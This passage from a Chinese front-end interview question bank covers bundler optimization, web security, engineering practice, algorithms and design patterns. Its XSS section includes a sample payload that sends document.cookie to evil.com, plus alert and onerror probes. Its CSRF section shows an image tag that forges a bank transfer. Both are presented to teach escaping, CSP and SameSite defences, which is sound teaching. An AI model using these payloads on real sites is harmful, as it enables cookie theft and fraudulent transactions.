<img loading="lazy" src="image.jpg" alt="懒加载图片">

<!-- 4. CSS 背景图用 image-set 适配 DPR -->
```

```css
/* 5. 宽高比占位（防止 CLS）*/
img {
  aspect-ratio: 16 / 9;
  object-fit: cover; /* 压缩不拉伸 */
}

.hero {
  /* 方便用现代 CSS 属性 */
  background-image: image-set(
    url("hero.webp") 1x,
    url("hero@2x.webp") 2x
  );
}
```

---

### 74. Webpack / Vite 的打包优化经验？

**⭐⭐⭐**

```javascript
// ===== Webpack 优化 =====
// 1. 缩小构建范围
module.exports = {
  module: {
    rules: [{
      test: /\.js$/,
      include: path.resolve(__dirname, 'src'), // ← 关键
      // exclude: /node_modules/,
      use: 'babel-loader'
    }]
  },
  resolve: {
    extensions: ['.js', '.jsx'], // ← 减少尝试的文件扩展
    alias: {
      '@': path.resolve(__dirname, 'src')
    }
  }
}

// 2. 缓存
// Webpack 5 内置持久化缓存
module.exports = {
  cache: {
    type: 'filesystem' // 磁盘缓存，二次构建极快
  }
}

// 3. 代码分割
module.exports = {
  optimization: {
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        vendor: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendor',
          priority: 10
        },
        common: {
          minChunks: 2,
          priority: 5,
          reuseExistingChunk: true
        }
      }
    }
  }
}

// 4. 多线程/多进程
// thread-loader / terser-webpack-plugin parallel
// HappyPack (已过时)

// ===== Vite 优化 =====
// vite.config.js
export default {
  build: {
    // chunk 拆分
    rollupOptions: {
      output: {
        manualChunks: {
          vendor: ['vue', 'vue-router', 'pinia'],
          ui: ['element-plus'],
        }
      }
    },
    // 目标浏览器
    target: 'es2015',
    // 压缩
    minify: 'terser' | 'esbuild',
  },
  // 预构建（开发模式）
  optimizeDeps: {
    include: ['lodash-es'],
    exclude: []
  }
}

// ===== 分析工具 =====
// webpack-bundle-analyzer
// vite-plugin-visualizer
// 关注：最大 chunk 体积、重复依赖、未使用的包
```

---

### 75. tree-shaking 为什么需要 ESM？

**⭐⭐**

```javascript
// Tree Shaking: 移除未使用的代码
// 核心：必须静态分析哪些 export 被 import 使用了

// ✅ ESM: 静态结构，编译时确定依赖
// import { add } from './math'
// 编译器知道只用了 add → 删除 subtract, multiply

// ❌ CJS: 动态结构，运行时确定依赖
// const math = require('./math')
// 编译器不知道 math 的哪个属性被用到了 → 不敢删除
// 即使你只用了 math.add，整个 math 模块都会被打包

// 这也是为什么很多库开始提供 ESM 版本（lodash-es 等）
```

---

## 十一、前端安全

### 76. XSS 攻击是什么？如何防范？

**⭐⭐⭐⭐⭐ · 必问**

```javascript
// XSS (Cross-Site Scripting): 注入恶意脚本到页面

// ===== 类型 1: 存储型 XSS =====
// 恶意脚本存储在服务器（评论、个人信息等）
// 其他用户访问时被触发

// 假如用户评论:<script>fetch('https://evil.com?c='+document.cookie)</script>
// ❌ 直接渲染 HTML:
div.innerHTML = comment // 危险！脚本被执行

// ✅ 防范
// 1. HTML 转义
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
}
div.textContent = comment // ✅ 自动转义

// ===== 类型 2: 反射型 XSS =====
// 恶意脚本在 URL 参数中，立即反射执行
// https://site.com/search?q=<script>alert(1)</script>

// ===== 类型 3: DOM 型 XSS =====
// 纯前端问题：恶意数据被不安全地写入 DOM
const hash = location.hash.slice(1) // #<img src=x onerror=alert(1)>
document.write(hash) // ❌ 危险！

// ===== 全面防范 =====
// 1. 永远不要相信用户输入 → 转义输出
// 2. CSP (Content-Security-Policy)
// Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'
// 3. HttpOnly Cookie → JS 无法读取
// 4. 现代框架默认转义（Vue/React 的 {{ }} 是安全的）
// 5. 谨慎使用 v-html / innerHTML / dangerouslySetInnerHTML
// 6. 输入验证和过滤（白名单优于黑名单）
```

---

### 77. CSRF 攻击是什么？如何防范？

**⭐⭐⭐⭐⭐ · 必问**

```javascript
// CSRF (Cross-Site Request Forgery): 跨站请求伪造
// 利用用户已登录的身份，诱导用户点击恶意链接

// 场景：
// 1. 用户登录 bank.com（有 cookie）
// 2. 用户访问 evil.com（恶意网站）
// 3. evil.com 中有 <img src="https://bank.com/transfer?to=hacker&amount=10000">
// 4. 浏览器自动带上 bank.com 的 cookie
// 5. 转账成功！

// ===== 防范方案 =====
// 1. SameSite Cookie（现代首选）
// Set-Cookie: sessionId=xxx; SameSite=Strict
// Strict: 完全禁止第三方请求带 Cookie
// Lax: 允许链接跳转，禁止 POST/iframe

// 2. CSRF Token（服务端生成）
// 服务端生成随机 token
// 页面表单中嵌入: <input type="hidden" name="csrf_token" value="random-token">
// 提交时验证：请求中的 token === session 中的 token
// 恶意网站无法获取这个 token（同源策略）

// 3. 验证 Referer/Origin 请求头
// 服务器检查请求来源是否合法

// 4. 双重 Cookie 验证
// 前端从 Cookie 读取 token 放入请求头
// 后端验证 Cookie 和请求头中的 token 一致
```

**面试要点：** XSS 是「注入脚本」，CSRF 是「借刀杀人」。SameSite Cookie 是现代简单高效的 CSRF 防护。

---

### 78. 如何防止点击劫持 (Clickjacking)？

**⭐⭐**

```html
<!-- 点击劫持：恶意网站用透明的 iframe 覆盖在按钮上 -->
<!-- 用户以为点击的是视频播放按钮，实际点击的是银行转账 -->

<!-- 防范：X-Frame-Options / CSP frame-ancestors -->
<!-- 方式 1: HTTP 响应头 -->
<!-- X-Frame-Options: DENY (完全禁止) -->
<!-- X-Frame-Options: SAMEORIGIN (只允许同源) -->

<!-- 方式 2: CSP 写法（推荐）-->
<!-- Content-Security-Policy: frame-ancestors 'self' -->

<!-- 方式 3: JS 防御（不靠谱，可被绕过）-->
<script>
if (window.top !== window.self) {
  window.top.location = window.self.location
}
</script>
```

---

### 79. 常见的 Web 安全其他攻击及防御？

**⭐⭐⭐**

```javascript
// 1. SQL 注入
// ❌ const query = `SELECT * FROM users WHERE id = ${userId}`
// ✅ 参数化查询 / ORM

// 2. DDoS (分布式拒绝服务)
// 防范：CDN、限流、验证码、WAF

// 3. 中间人攻击 (MITM)
// 防范：HTTPS + HSTS

// 4. 敏感信息泄露
// .git 泄露 → 不要把 .git 部署到服务器
// 前端环境变量不要包含敏感 Key → 敏感操作放后端
// console.log 生产环境移除

// 5. 依赖供应链攻击
// npm audit / Snyk 检查漏洞
// lockfile 锁定版本
// 审核第三方包的权限

// 6. postMessage 滥用
window.addEventListener('message', (e) => {
  // ✅ 必须验证 origin！
  if (e.origin !== 'https://trusted-domain.com') return
  // 处理数据
})
```

---

## 十二、前端工程化

### 80. 前端模块化的发展历程？

**⭐⭐⭐**

```javascript
// 阶段 1: 全局函数模式（1990s）
function foo() {} // 全局污染
function bar() {} // 命名冲突

// 阶段 2: IIFE 命名空间（2000s）
const Module = (function() {
  const privateVar = 'secret'
  return {
    publicMethod: () => privateVar
  }
})()

// 阶段 3: CommonJS（2009, Node.js）
// 同步加载，服务端友好
const math = require('./math')
module.exports = { add }

// 阶段 4: AMD（2009, RequireJS）
// 异步加载，浏览器友好
define(['./math'], function(math) {
  return { add: math.add }
})

// 阶段 5: CMD（2011, SeaJS）
// 按需加载，就近依赖

// 阶段 6: UMD（通用模块定义）
// 兼容 CommonJS + AMD + 全局变量

// 阶段 7: ESM（2015, ES6 标准）
import { add } from './math.js' // 静态导入
const module = await import('./math.js') // 动态导入
// 现在的主流方案！
```

---

### 81. Webpack 的 Loader 和 Plugin 有什么区别？

**⭐⭐⭐**

```javascript
// Loader: 文件转换器
// - 本质是函数，输入文件内容，输出转换后的内容
// - 用于处理非 JS 文件（CSS、图片、字体等）
// - 链式调用（从右到左）

// 自定义 Loader
module.exports = function(source) {
  // source 是文件原始内容
  const result = source.replace(/console\.log\(.*\);?/g, '') // 移除 console.log
  return result
}

// Plugin: 构建流程扩展
// - 基于事件钩子（Tapable）
// - 可以做任何 Loader 做不了的事
// - 改变打包输出、注入变量、生成 HTML 等

// 自定义 Plugin
class RemoveCommentPlugin {
  apply(compiler) {
    compiler.hooks.emit.tap('RemoveCommentPlugin', (compilation) => {
      for (const filename in compilation.assets) {
        if (filename.endsWith('.js')) {
          const source = compilation.assets[filename].source()
          const withoutComments = source.replace(/\/\*[\s\S]*?\*\/|\/\/.*/g, '')
          compilation.assets[filename] = {
            source: () => withoutComments,
            size: () => withoutComments.length
          }
        }
      }
    })
  }
}

// 形象理解
// Loader: 翻译官（把各种语言翻译成 JS）
// Plugin: 管家（在整个构建生命周期中做各种事情）
```

---

### 82. Webpack 的热更新（HMR）原理？

**⭐⭐⭐**

```
HMR (Hot Module Replacement) 原理：

1. WebpackDevServer 使用 WebSocket 与浏览器通信
2. 文件变化 → 重新编译 → 生成新模块和 manifest（变更列表）
3. WebSocket 推送 { type: 'hash', data: 'new-hash' }
4. 浏览器发送 jsonp 请求获取 manifest
5. 浏览器加载更新后的模块代码
6. 执行模块热替换（accept 回调）

// Vue/React 的 HMR：
// if (module.hot) {
//   module.hot.accept('./component.vue', () => {
//     // 替换组件但不刷新页面，保留状态
//   })
// }

关键点：
- WebSocket 推送变更通知
- JSONP 拉取 chunk 更新
- accept 回调只替换模块，不刷新页面
- 保留应用状态（表单输入不丢失）
```

---

### 83. 如何实现一个简单的 CI/CD 流程？

**⭐⭐**

```
CI/CD 流水线：

代码提交 (git push)
  ↓
代码检查 (ESLint + Prettier)         ← CI
  ↓
类型检查 (TypeScript)
  ↓
单元测试 (Vitest/Jest)
  ↓
构建打包 (npm run build)
  ↓
部署到测试环境                         ← CD
  ↓
E2E 测试 (Playwright/Cypress)
  ↓
部署到生产环境                         ← CD

// 前端常见 CI/CD 工具
// GitHub Actions / GitLab CI / Jenkins
// 部署: Docker + Nginx / Vercel / CloudBase

// 面试要点：
// - 代码检查 → 测试 → 构建 → 部署
// - 至少能说出完整流程和常用工具
```

---

### 84. 企业级项目的目录结构如何设计？

**⭐⭐**

```
src/
├── assets/            # 静态资源（图片、字体）
├── components/        # 公共组件
│   ├── ui/            # 基础 UI 组件（按钮、输入框）
│   └── business/      # 业务组件
├── composables/       # 组合式函数 / hooks
├── layouts/           # 布局组件
├── pages/             # 页面组件
│   └── user/
│       ├── index.vue
│       └── components/ # 页面私有组件
├── router/            # 路由配置
├── stores/            # 状态管理
├── api/               # API 请求层
│   ├── request.ts     # 请求封装（拦截器、错误处理）
│   └── modules/       # 按模块划分的 API
│       └── user.ts
├── utils/             # 工具函数
├── types/             # TypeScript 类型定义
├── constants/         # 常量定义
└── styles/            # 全局样式

// 设计原则：
// 1. 就近原则：页面私有组件放页面目录
// 2. 关注点分离：API / 状态 / UI 分层
// 3. 按功能而非按文件类型组织
```

---

### 85. 如何进行前端项目的版本管理和发布策略？

**⭐⭐**

```javascript
// 语义化版本 (SemVer): MAJOR.MINOR.PATCH
// 1.0.0 → 1.0.1 (PATCH: bug 修复)
// 1.0.0 → 1.1.0 (MINOR: 新功能，向下兼容)
// 1.0.0 → 2.0.0 (MAJOR: 不兼容的 API 变更)

// CHANGELOG.md: 记录每个版本的变更
// 工具：standard-version / changesets

// 发布策略
// 1. 蓝绿部署：两套环境切换
// 2. 灰度发布：按用户比例逐步放量
// 3. 特性开关 (Feature Flag): 代码先合并，功能开关控制

// Git 分支策略
// Git Flow: main → develop → feature → release → hotfix
// Trunk Based: 所有人提交到 main → 用 feature flag 控制
```

---

## 十三、数据结构与算法（前端方向）

### 86. 数组去重有哪些方法？

**⭐⭐⭐⭐ · 高频面试手写**

```javascript
const arr = [1, 2, 3, 1, 2, { a: 1 }, { a: 1 }, NaN, NaN]

// 方式 1: Set（简单去重，不包括对象）
const unique1 = [...new Set(arr)]
// [1, 2, 3, {a:1}, {a:1}]
// Set 中 NaN === NaN 为 true（去重了 NaN）
// 对象按引用去重（两个 {a:1} 不同引用，不去重）

// 方式 2: filter + indexOf
const unique2 = arr.filter((item, index) => arr.indexOf(item) === index)
// 缺点：NaN !== NaN，indexOf 找不到 NaN → 所有 NaN 都被过滤了

// 方式 3: includes
const unique3 = arr.reduce((acc, cur) =>
  acc.includes(cur) ? acc : [...acc, cur], [])
// includes 用 SameValueZero 比较，NaN 能识别

// 方式 4: Map 按对象属性去重
const uniqueByKey = (arr, key) => {
  const map = new Map()
  return arr.filter(item => !map.has(item[key]) && map.set(item[key], true))
}
uniqueByKey([{ id: 1 }, { id: 2 }, { id: 1 }], 'id')
// [{ id: 1 }, { id: 2 }]
```

---

### 87. 手写数组扁平化 flat

**⭐⭐⭐⭐ · 高频面试手写**

```javascript
function flat(arr, depth = 1) {
  const result = []

  for (const item of arr) {
    if (Array.isArray(item) && depth > 0) {
      result.push(...flat(item, depth - 1))
    } else {
      result.push(item)
    }
  }

  return result
}

// 迭代版（栈）
function flatIterative(arr) {
  const stack = [...arr]
  const result = []

  while (stack.length) {
    const item = stack.pop()
    if (Array.isArray(item)) {
      stack.push(...item) // 展开后继续处理
    } else {
      result.unshift(item) // 非数组直接加（unshift 保持顺序）
    }
  }

  return result
}

// 指定深度
function flatDepth(arr, depth = 1) {
  if (depth <= 0) return arr.slice()

  return arr.reduce((acc, item) =>
    acc.concat(Array.isArray(item) ? flatDepth(item, depth - 1) : item), [])
}

console.log(flat([1, [2, [3, [4]]]], 2))
// [1, 2, 3, [4]]
```

---

### 88. 手写深拷贝（包含循环引用和特殊类型）

**⭐⭐⭐⭐⭐ · 此题为第 30 题的进阶手写题**

见第 30 题「深拷贝和浅拷贝的区别？如何实现深拷贝？」中的手写实现。

---

### 89. 实现一个 EventEmitter（发布订阅）

**⭐⭐⭐⭐ · 高频面试手写**

```javascript
class EventEmitter {
  constructor() {
    this.events = {}
  }

  on(event, callback) {
    if (!this.events[event]) {
      this.events[event] = []
    }
    this.events[event].push(callback)
    return this // 支持链式调用
  }

  once(event, callback) {
    const wrapper = (...args) => {
      callback.apply(this, args)
      this.off(event, wrapper)
    }
    this.on(event, wrapper)
    return this
  }

  off(event, callback) {
    if (!this.events[event]) return this
    if (!callback) {
      delete this.events[event]
      return this
    }
    this.events[event] = this.events[event].filter(cb => cb !== callback)
    return this
  }

  emit(event, ...args) {
    if (!this.events[event]) return false
    this.events[event].forEach(cb => cb.apply(this, args))
    return true
  }

  // 与 on 相同，只是事件名前面加 ~ 标记为触发一次后删除
}

const emitter = new EventEmitter()

const fn1 = (msg) => console.log('fn1:', msg)
const fn2 = (msg) => console.log('fn2:', msg)

emitter.on('data', fn1)
emitter.on('data', fn2)
emitter.once('once', (msg) => console.log('只触发一次:', msg))

emitter.emit('data', 'hello') // fn1: hello, fn2: hello
emitter.emit('once', 'first') // 只触发一次: first
emitter.emit('once', 'second') // 无输出
emitter.off('data', fn1)
emitter.emit('data', 'world') // fn2: world
```

---

### 90. 实现 LRU 缓存

**⭐⭐⭐ · 面试加分手写**

```javascript
class LRUCache {
  constructor(capacity) {
    this.capacity = capacity
    this.cache = new Map() // Map 保持插入顺序
  }

  get(key) {
    if (!this.cache.has(key)) return -1

    // 访问后移到末尾（最近使用）
    const value = this.cache.get(key)
    this.cache.delete(key)
    this.cache.set(key, value)
    return value
  }

  put(key, value) {
    // 如果已存在，先删除
    if (this.cache.has(key)) {
      this.cache.delete(key)
    }
    // 设置新值（在末尾）
    this.cache.set(key, value)

    // 容量超限，删除最久未使用（第一个）
    if (this.cache.size > this.capacity) {
      const firstKey = this.cache.keys().next().value
      this.cache.delete(firstKey)
    }
  }
}

// 测试
const lru = new LRUCache(2)
lru.put(1, 'a')
lru.put(2, 'b')
console.log(lru.get(1)) // 'a'（1 移到末尾）
lru.put(3, 'c')         // 删除 2（最久未用）
console.log(lru.get(2)) // -1
console.log(lru.get(1)) // 'a'
console.log(lru.get(3)) // 'c'
```

---

### 91. 常见的排序算法实现

**⭐⭐⭐**

```javascript
// 1. 快速排序（分治）
function quickSort(arr) {
  if (arr.length <= 1) return arr

  const pivot = arr[Math.floor(arr.length / 2)]
  const left = arr.filter(x => x < pivot)
  const middle = arr.filter(x => x === pivot)
  const right = arr.filter(x => x > pivot)

  return [...quickSort(left), ...middle, ...quickSort(right)]
}

// 原地快排（节省空间）
function quickSortInPlace(arr, left = 0, right = arr.length - 1) {
  if (left >= right) return arr

  const pivotIndex = partition(arr, left, right)
  quickSortInPlace(arr, left, pivotIndex - 1)
  quickSortInPlace(arr, pivotIndex + 1, right)
  return arr
}

function partition(arr, left, right) {
  const pivot = arr[right]
  let i = left

  for (let j = left; j < right; j++) {
    if (arr[j] < pivot) {
      ;[arr[i], arr[j]] = [arr[j], arr[i]]
      i++
    }
  }
  ;[arr[i], arr[right]] = [arr[right], arr[i]]
  return i
}

// 2. 归并排序（分治、稳定）
function mergeSort(arr) {
  if (arr.length <= 1) return arr

  const mid = Math.floor(arr.length / 2)
  const left = mergeSort(arr.slice(0, mid))
  const right = mergeSort(arr.slice(mid))

  return merge(left, right)
}

function merge(left, right) {
  const result = []
  let i = 0, j = 0

  while (i < left.length && j < right.length) {
    result.push(left[i] <= right[j] ? left[i++] : right[j++])
  }
  return [...result, ...left.slice(i), ...right.slice(j)]
}

// 算法对比
// 快排: 平均 O(nlogn), 不稳定, 最坏 O(n²), 原地
// 归并: 平均 O(nlogn), 稳定, O(n) 额外空间
// 插入: O(n²), 稳定, 小数据或近乎有序时极快
// 冒泡: O(n²), 稳定, 最简单
```

---

### 92. 树形结构操作：遍历与查找

**⭐⭐⭐**

```javascript
const tree = {
  id: 1,
  name: 'root',
  children: [
    { id: 2, name: 'child1', children: [] },
    {
      id: 3,
      name: 'child2',
      children: [
        { id: 4, name: 'grandchild', children: [] }
      ]
    }
  ]
}

// ===== 深度优先遍历 (DFS) =====
function dfs(node, fn) {
  fn(node)
  if (node.children) {
    node.children.forEach(child => dfs(child, fn))
  }
}

function dfsStack(root, fn) {
  const stack = [root]
  while (stack.length) {
    const node = stack.pop()
    fn(node)
    if (node.children) {
      // 倒序入栈保持从左到右
      stack.push(...node.children.reverse())
    }
  }
}

// ===== 广度优先遍历 (BFS) =====
function bfs(root, fn) {
  const queue = [root]
  while (queue.length) {
    const node = queue.shift()
    fn(node)
    if (node.children) {
      queue.push(...node.children)
    }
  }
}

// ===== 查找节点 =====
function findById(node, id) {
  if (node.id === id) return node
  if (node.children) {
    for (const child of node.children) {
      const found = findById(child, id)
      if (found) return found
    }
  }
  return null
}

// ===== 列表 ↔ 树形转换 =====
// 列表结构（id + parentId）
const list = [
  { id: 1, parentId: null, name: 'root' },
  { id: 2, parentId: 1, name: 'child1' },
  { id: 3, parentId: 1, name: 'child2' },
  { id: 4, parentId: 3, name: 'grandchild' },
]

// 列表 → 树
function listToTree(list) {
  const map = {}
  const result = []

  // 建立 id 映射
  list.forEach(item => {
    map[item.id] = { ...item, children: [] }
  })

  // 建立父子关系
  list.forEach(item => {
    if (item.parentId === null) {
      result.push(map[item.id])
    } else {
      map[item.parentId]?.children.push(map[item.id])
    }
  })

  return result
}

// 树 → 列表
function treeToList(tree) {
  const result = []

  function traverse(nodes, parentId = null) {
    nodes.forEach(node => {
      result.push({ id: node.id, name: node.name, parentId })
      if (node.children) {
        traverse(node.children, node.id)
      }
    })
  }

  traverse(tree)
  return result
}
```

---

### 93. 字符串相关算法

**⭐⭐**

```javascript
// 1. 判断回文字符串
function isPalindrome(str) {
  const cleaned = str.replace(/[^a-zA-Z0-9]/g, '').toLowerCase()
  let left = 0, right = cleaned.length - 1
  while (left < right) {
    if (cleaned[left++] !== cleaned[right--]) return false
  }
  return true
}
// isPalindrome('A man, a plan, a canal: Panama') → true

// 2. 最长不重复子串
function lengthOfLongestSubstring(s) {
  const map = new Map()
  let left = 0, max = 0

  for (let right = 0; right < s.length; right++) {
    if (map.has(s[right]) && map.get(s[right]) >= left) {
      left = map.get(s[right]) + 1
    }
    map.set(s[right], right)
    max = Math.max(max, right - left + 1)
  }

  return max
}
// lengthOfLongestSubstring('abcabcbb') → 3 ('abc')

// 3. 千分位格式化
function formatNumber(num) {
  const [intPart, decimalPart] = String(num).split('.')
  const formatted = intPart.replace(/\B(?=(\d{3})+(?!\d))/g, ',')
  return decimalPart ? `${formatted}.${decimalPart}` : formatted
}
// formatNumber(1234567.89) → '1,234,567.89'

// 4. 解析 URL 参数
function parseURLParams(url) {
  const params = {}
  const search = url.split('?')[1]
  if (!search) return params

  search.split('&').forEach(pair => {
    const [key, value] = pair.split('=')
    const decodedKey = decodeURIComponent(key)
    const decodedValue = value ? decodeURIComponent(value) : ''
    // 重复 key → 数组
    if (params.hasOwnProperty(decodedKey)) {
      params[decodedKey] = [].concat(params[decodedKey], decodedValue)
    } else {
      params[decodedKey] = decodedValue
    }
  })

  return params
}
```

---

### 94. 大数相加

**⭐⭐ · 手写**

```javascript
// JS 安全整数范围: -(2^53 - 1) ~ (2^53 - 1)
// Number.MAX_SAFE_INTEGER = 9007199254740991

function bigAdd(a, b) {
  const arrA = a.split('').reverse()
  const arrB = b.split('').reverse()
  const result = []
  let carry = 0
  const maxLen = Math.max(arrA.length, arrB.length)

  for (let i = 0; i < maxLen; i++) {
    const sum = (Number(arrA[i]) || 0) + (Number(arrB[i]) || 0) + carry
    result.push(sum % 10)
    carry = Math.floor(sum / 10)
  }

  if (carry) result.push(carry)

  return result.reverse().join('')
}

console.log(bigAdd('99999999999999999999', '1'))
// '100000000000000000000'

// 现代方案: BigInt
const result = 99999999999999999999n + 1n // 100000000000000000000n
```

---

### 95. 常见设计模式在前端的应用

**⭐⭐⭐**

```javascript
// 1. 单例模式
// 全局弹窗、全局状态管理器
class SingletonModal {
  static instance = null
  constructor() {
    if (SingletonModal.instance) return SingletonModal.instance
    SingletonModal.instance = this
    this.visible = false
  }
}
const modal1 = new SingletonModal()
const modal2 = new SingletonModal()
console.log(modal1 === modal2) // true

// 2. 观察者模式 / 发布-订阅
// 事件系统、响应式数据（见 EventEmitter 题）

// 3. 策略模式
// 表单校验、支付方式选择
const strategies = {
  alipay: (amount) => { /* 支付宝支付 */ },
  wechat: (amount) => { /* 微信支付 */ },
  card: (amount) => { /* 银行卡支付 */ },
}

function pay(type, amount) {
  return strategies[type]?.(amount)
}

// 4. 装饰器模式
// HOC（高阶组件）、AOP 切面
const withLogger = (fn) => (...args) => {
  console.log(`调用 ${fn.name}，参数:`, args)
  const result = fn(...args)
  console.log(`返回:`, result)
  return result
}

// 5. 代理模式
// 图片懒加载、缓存代理
const createImage = (() => {
  const img = new Image()
  img.loading = true
  return {
    setSrc(src) {
      img.loading = true
      const proxyImg = new Image()
      proxyImg.onload = () => {
        img.src = src
        img.loading = false
      }
      proxyImg.src = src
    }
  }
})()

// 6. 工厂模式
function createUser(type) {
  const types = {
    admin: { name: 'Admin', permissions: ['read', 'write', 'delete'] },
    editor: { name: 'Editor', permissions: ['read', 'write'] },
    viewer: { name: 'Viewer', permissions: ['read'] },
  }
  return { ...types[type], createdAt: new Date() }
}
```

**面试要点：** 至少能说清楚单例、观察者、策略三种模式及前端应用场景。

---

### 96. 什么是函数柯里化？如何手写一个通用 curry？

**⭐⭐⭐**

```javascript
// 柯里化：将接受多个参数的函数 → 接受单一参数的函数序列
// f(a, b, c) → f(a)(b)(c)

// 通用 curry
function curry(fn, ...args) {
  // 如果传入参数够了，直接执行
  if (args.length >= fn.length) {
    return fn.apply(this, args)
  }
  // 不够则返回一个新函数继续收集参数
  return function(...newArgs) {
    return curry.call(this, fn, ...args, ...newArgs)
  }
}

// 使用
function add(a, b, c) {
  return a + b + c
}

const curriedAdd = curry(add)

console.log(curriedAdd(1)(2)(3))     // 6
console.log(curriedAdd(1, 2)(3))     // 6
console.log(curriedAdd(1)(2, 3))     // 6
console.log(curriedAdd(1, 2, 3))     // 6

// 实际应用：参数复用
const api = curry((baseURL, path, method) =>
  fetch(`${baseURL}${path}`, { method })
)

const githubAPI = api('https://api.github.com')
const getGithub = githubAPI('/repos')

// 类型判断工具
const isType = curry((type, val) =>
  Object.prototype.toString.call(val) === `[object ${type}]`
)
const isString = isType('String')
const isArray = isType('Array')
```

---

### 97. 从输入 URL 到页面渲染全链路（完整面试流程）

**⭐⭐⭐⭐⭐ · 综合大厂反问**

> 此题为第 3 题的面试版，考察表达能力与知识广度。回答结构：

```
1. 网络阶段 (30秒)
   DNS 解析 → TCP 连接(三次握手) → TLS 握手(HTTPS) → 发送 HTTP 请求
   优化点：dns-prefetch, preconnect, CDN, HTTP/2

2. 服务器处理 (10秒)
   反向代理 → 应用处理 → 返回响应
   优化点：SSR/SSG, 缓存策略(Cache-Control/ETag)

3. 浏览器解析 (40秒)
   构建 DOM 树 → 构建 CSSOM 树 → 构建渲染树 → 布局 → 绘制 → 合成
   优化点：CSS 不阻塞 DOM，JS 阻塞 DOM(除非 async/defer)

4. 性能优化 (20秒)
   代码分割、资源预加载、图片优化、关键渲染路径优化

核心三句话总结：
- 网络：DNS→TCP→TLS→HTTP，越快越好
- 渲染：DOM+CSSOM→RenderTree→Layout→Paint→Composite
- 优化：减少阻塞、减少体积、减少请求
```

---

### 98. 前端大文件上传方案设计

**⭐⭐⭐**

```javascript
// 核心方案：分片上传 + 断点续传 + 秒传

// 1. 文件分片
function createChunks(file, chunkSize = 5 * 1024 * 1024) { // 5MB
  const chunks = []
  let start = 0
  while (start < file.size) {
    const end = Math.min(start + chunkSize, file.size)
    chunks.push({
      file: file.slice(start, end),
      index: chunks.length,
      hash: '', // 需要计算
    })
    start = end
  }
  return chunks
}

// 2. 计算文件 hash（web worker）
// 使用 spark-md5 在 Worker 中计算，避免阻塞主线程

// 3. 秒传验证：发送 hash 给服务端，服务端返回已有分片索引
// 4. 并发上传缺失的分片（Promise.all 控制并发数）
// 5. 全部分片上传完成后，服务端合并分片

// ===== resumable 上传封装 =====
class FileUploader {
  constructor(file, options = {}) {
    this.file = file
    this.chunkSize = options.chunkSize || 5 * 1024 * 1024
    this.concurrency = options.concurrency || 3
    this.uploadedChunks = new Set()
    this.chunks = []
  }

  async upload(onProgress) {
    // 1. 分片
    this.chunks = this.createChunks()

    // 2. 计算 hash
    const hash = await this.calculateHash()

    // 3. 秒传验证
    const { uploaded } = await this.verify(hash)
    uploaded.forEach(index => this.uploadedChunks.add(index))

    // 4. 上传未完成的分片
    const pendingChunks = this.chunks.filter(
      (_, index) => !this.uploadedChunks.has(index)
    )

    await this.uploadChunks(pendingChunks, onProgress)

    // 5. 通知服务端合并
    await this.merge(hash)
  }

  createChunks() { /* 见上 */ }

  async calculateHash() { /* Worker 中计算 */ }

  async verify(hash) { /* API 调用 */ }

  async uploadChunks(chunks, onProgress) {
    let completed = 0
    const pool = async (tasks, limit) => {
      const executing = new Set()
      for (const task of tasks) {
        const p = Promise.resolve().then(() => task())
        executing.add(p)
        const clean = () => executing.delete(p)
        p.then(clean, clean)
        if (executing.size >= limit) await Promise.race(executing)
      }
      return Promise.all(executing)
    }

    const tasks = chunks.map((chunk, index) => async () => {
      const formData = new FormData()
      formData.append('chunk', chunk.file)
      formData.append('index', chunk.index)
      await fetch('/api/upload-chunk', {
        method: 'POST',
        body: formData,
      })
      completed++
      onProgress?.(completed / chunks.length)
    })

    await pool(tasks, this.concurrency)
  }

  async merge(hash) {
    await fetch('/api/merge', {
      method: 'POST',
      body: JSON.stringify({ hash, filename: this.file.name }),
      headers: { 'Content-Type': 'application/json' },
    })
  }
}
```

---

### 99. 微前端架构的核心原理

**⭐⭐**

```javascript
// 微前端：将大型前端应用拆分为多个独立的小应用
// 每个按独立的生命周期开发、部署

// 核心问题：
// 1. 子应用如何加载？
// 2. 子应用之间如何隔离（JS/CSS）？
// 3. 子应用之间如何通信？
// 4. 路由如何分发？

// 主流方案：
// 1. Single-SPA: 路由分发 + 生命周期管理
// 2. qiankun: 基于 single-spa，增加沙箱隔离
// 3. Module Federation (Webpack 5): 运行时代码共享
// 4. Micro-app: 基于 Web Component + iframe 思路

// ===== qiankun 原理简析 =====
// JS 沙箱：Proxy 代理 window，子应用对 window 的读写被拦截
// CSS 沙箱：给子应用样式加前缀 scope
// 生命周期：
//   bootstrap → mount → unmount → update

// 适用场景：
// ✅ 多团队协作、独立部署
// ✅ 老项目渐进式迁移
// ✅ 巨石应用拆分
// ❌ 小团队、高耦合模块、追求极致性能
```

---

### 100. 2025-2026 前端趋势与面试高频 TOP 10

**⭐⭐⭐**

```
趋势：
├─ AI 集成：AI 辅助编码、AI 生成 UI (v0/GitHub Copilot)
├─ Rust 工具链：Rspack/Turbopack 替代 Webpack，SWC/Lightning CSS 替代 Babel/PostCSS
├─ SSR/SSG/ISR：Next.js 15 / Nuxt 4 / Remix 成为标配
├─ TypeScript 主导：泛型组件、类型体操、类型优先思维
├─ 边缘计算：Vercel Edge / Cloudflare Workers / Deno Deploy
├─ Web Components：跨框架 UI 库（Shoelace/FAST）
├─ 服务器组件 (RSC)：React Server Components 改变架构思维
├─ Bun：全能 JS 运行时（打包 + 测试 + 包管理）
├─ CSS Container Queries / View Transitions API
└─ 跨端开发：Taro 4 / uni-app x / React Native New Architecture

面试 TOP 10 高频题：
1.  URL 到页面的全过程（第 3 / 97 题）
2.  Event Loop + 微任务/宏任务（第 28 题）
3.  原型链 + 手写 instanceof（第 24 题）
4.  this 指向 + 手写 call/apply/bind（第 26 题）
5.  闭包 + 实际应用场景（第 25 题）
6.  Promise + 手写 Promise.all（第 35 题）
7.  深拷贝（含循环引用）（第 30 题）
8.  防抖节流 + 手写（第 31 题）
9.  跨域解决方案 CORS（第 58 题）
10. 浏览器缓存（强缓存/协商缓存）（第 57 题）

手写题 TOP 5：
1. 防抖/节流
2. 深拷贝
3. Promise.all / Promise.race
4. call/apply/bind
5. 发布订阅 (EventEmitter)
```

---

